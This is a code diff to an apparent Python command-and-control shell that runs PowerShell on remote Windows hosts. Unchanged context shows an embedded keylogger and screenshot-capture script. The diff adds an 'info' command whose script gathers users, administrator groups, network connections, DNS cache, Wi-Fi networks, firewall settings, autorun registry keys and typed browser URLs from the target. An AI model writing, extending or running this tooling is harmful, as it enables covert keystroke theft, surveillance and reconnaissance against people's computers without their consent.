@@ -41,7 +41,7 @@ class Shell(object):
        \###.    .)
         `======/
   """
-  SCREENSHOT_SCRIPT = """
+  SCREENSHOT_SCRIPT = r"""
   [System.Reflection.Assembly]::LoadWithPartialName('System.Drawing') | out-null;
   [System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms') | out-null;
   $d = (Get-ItemProperty 'HKCU:\Control Panel\Desktop\WindowMetrics' -Name AppliedDPI).AppliedDPI;
@@ -65,7 +65,7 @@ class Shell(object):
   $b.Save('_.png');
   Get-ItemProperty '_.png';
   """
-  KEYLOGGER_SCRIPT = """
+  KEYLOGGER_SCRIPT = r"""
   $i = '[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] public static extern short GetAsyncKeyState(int virtualKeyCode);';
   $a = Add-Type -MemberDefinition $i -Name 'Win32' -Namespace API -PassThru;
   $t = new-timespan -Minutes 1;
@@ -81,6 +81,30 @@ class Shell(object):
   }
   $l -join '' | out-file '_.txt';
   Get-ItemProperty '_.txt';
+  """
+  INFO_SCRIPT = r"""
+  date;
+  whoami;
+  ipconfig /all;
+  systeminfo;
+  get-childitem "\\$env:COMPUTERNAME\c$\Users" | sort-object LastWriteTime -Descending | select-object Name;
+  net user;
+  net localgroup;
+  net localgroup administrators;
+  get-process;
+  get-service | Sort-Object -Property Status,Name;
+  netstat -ano;
+  route print;
+  ipconfig /displaydns;
+  arp -a;
+  netsh wlan show networks;
+  net share;
+  netsh advfirewall show allprofiles;
+  reg query 'HKCU\Software\Microsoft\Windows\CurrentVersion\Run';
+  reg query 'HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce';
+  reg query 'HKCU\Software\Microsoft\Internet Explorer';
+  reg query 'HKCU\Software\Microsoft\Internet Explorer\Main' /v 'Start Page' /t REG_SZ;
+  reg query 'HKCU\Software\Microsoft\Internet Explorer\TypedURLs';
   """
 
   def __init__(self, srv):
@@ -173,6 +197,7 @@ class Shell(object):
     print('run        <cmd>       - run command locally')
     print('screenshot <ip>        - capture screen on <ip>')
     print('keylogger  <ip>        - capture ASCII keystrokes on <ip> for 1 minute')
+    print('info       <ip>        - gather basic info about <ip>')
     print('shell      <ip>        - run powershell commands on <ip>')
     print('upload     <ip> <file> - upload local <file> to <ip>')
     print('download   <ip> <file> - download remote <file> from <ip>')
@@ -308,6 +333,21 @@ class Shell(object):
       logging.error('failed to delete keylogger file _.txt on {0}'.format(ip))
     print('SUCCESS - downloaded file _.txt')
 
+  def info(self, ip):
+    if not self.hosts:
+      logging.error('no hosts loaded. try running "ls"')
+      return
+    user = self.__u(ip)
+    if not user:
+      logging.error('invalid ip: {0}'.format(ip))
+      return
+    # run script to make log
+    logging.info('gathering info on {0} ...'.format(ip))
+    try:
+      d = self.__r(ip, user, self.INFO_SCRIPT.encode('UTF-16LE'), CMD_ID)
+      print(''.join([base64.b64decode(c).decode('UTF-8') for c in d]))
+    except:
+      logging.error('failed to run info script: {0}'.format(self.INFO_SCRIPT))
 
 if __name__ == '__main__':
   # parse user arguments
@@ -334,6 +374,12 @@ if __name__ == '__main__':
         logging.error('invalid arguments. run "help"')
         continue
       sh.shell(sh_args[0])
+    if c.startswith('info'):
+      sh_args = c.replace('info', '').strip().split(' ')
+      if len(sh_args) != 1:
+        logging.error('invalid arguments. run "help"')
+        continue
+      sh.info(sh_args[0])
     if c.startswith('screenshot'):
       sh_args = c.replace('screenshot', '').strip().split(' ')
       if len(sh_args) != 1:
